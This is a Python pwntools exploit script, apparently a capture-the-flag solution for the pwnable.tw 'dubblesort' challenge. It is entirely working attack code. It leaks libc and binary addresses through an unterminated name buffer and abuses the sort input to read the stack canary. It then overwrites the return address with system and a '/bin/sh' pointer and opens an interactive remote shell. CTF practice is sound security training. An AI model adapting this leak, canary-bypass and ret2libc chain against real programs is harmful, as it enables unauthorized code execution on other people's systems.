from pwn import *

DEBUG = 0

r = None

host = 'chall.pwnable.tw'
port = 10101

if DEBUG:
	r = process('./dubblesort')
	context.log_level = 'debug'
else:
	r = remote(host, port)

libc_offs = 0x1b0000
code_offs = 0x601
ld_offs = 0x24c04
og_offs = 0x5f065

payload = b'a' * 28
buf_len = 23
new_len = buf_len + 20

r.recvuntil(b'What your name :')
r.sendline(payload)

r.recv(len(payload) + len('Hello '))
data = r.recv(12)

libc_got = ( u32(data[:4]) & ~0xff )
libc = libc_got - libc_offs
pop_ebx_esi = libc + 0x00017827
one_gadget = libc + og_offs

code = u32(data[4:8]) - code_offs
main = code + 0x9c3

print(f'[+] Libc : {hex(libc)}\n[+] Code : {hex(code)}')

r.recvuntil(b',How many numbers do you what to sort :')
r.sendline(str(new_len).encode())

for i in range(new_len - 1):
	r.recvuntil(b': ')

	if i == new_len - 20:
		r.sendline(str(main).encode())
		break
	elif i >= 2 and i < 9:
		r.sendline(str(main).encode())
		continue

	r.sendline(b'1')

for i in range(19):
	r.recvuntil(b': ')
	r.sendline(b'-')

r.recvuntil(b'Result :\n')
data = r.recv(239).decode().strip().split()

canary = int(data[24])
ld_leak = int(data[-3])
libc_leak = int(data[-4])
ld = ld_leak - ld_offs

call_ebx = ld + 0x0000f122

sys = libc + 0x003a940
sh = libc + 0x158e8b
print(f'[+] Canary : {hex(canary)}\n[+] ld : {hex(ld)}\n[+] Libc got : {hex(libc_got)}\n[+] Libc : {hex(libc_leak)}')

r.sendline(b's4yHi')
r.recvuntil(b',How many numbers do you what to sort :')
r.sendline(b'32')

for i in range(24):	
	r.recvuntil(b': ')
	r.sendline(b'0')

for i in range(5):
	r.recvuntil(b': ')
	r.sendline(str(canary).encode())

r.recvuntil(b': ')
r.sendline(str(sys).encode())

r.recvuntil(b': ')
r.sendline(str(sh).encode())

r.recvuntil(b': ')
r.sendline(str(sh).encode())

r.interactive()
